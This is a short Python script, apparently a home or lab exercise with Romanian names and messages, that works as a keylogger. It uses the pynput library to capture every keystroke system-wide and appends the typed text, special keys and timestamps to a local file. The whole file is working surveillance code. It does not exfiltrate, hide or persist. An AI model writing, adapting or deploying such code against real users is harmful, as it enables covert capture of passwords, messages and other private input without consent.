from pynput import keyboard
from datetime import datetime
#backend = pynput._util.Backend.uinput

lista = []

def scrie_in_fisier():
    if lista:
        with open("/home/test1/Desktop/test/fisier_keylogger.txt", "a") as f:
            f.write(f"La ora {datetime.now()} fost tastat: {''.join(lista)} \n")



def on_press(key):
    global lista
    try:
        lista.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space or key == keyboard.Key.enter: 
            scrie_in_fisier()
            lista = []
            with open("/home/test1/Desktop/test/fisier_keylogger.txt", "a") as f:
                f.write(f"La ora {datetime.now()} a fost apasat butonul [{key}] \n")
        elif key == keyboard.Key.backspace:
            lista.pop()
        else:
            with open("/home/test1/Desktop/test/fisier_keylogger.txt", "a") as f:
                f.write(f"La ora {datetime.now()} a fost apasat butonul [{key}] \n")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
 
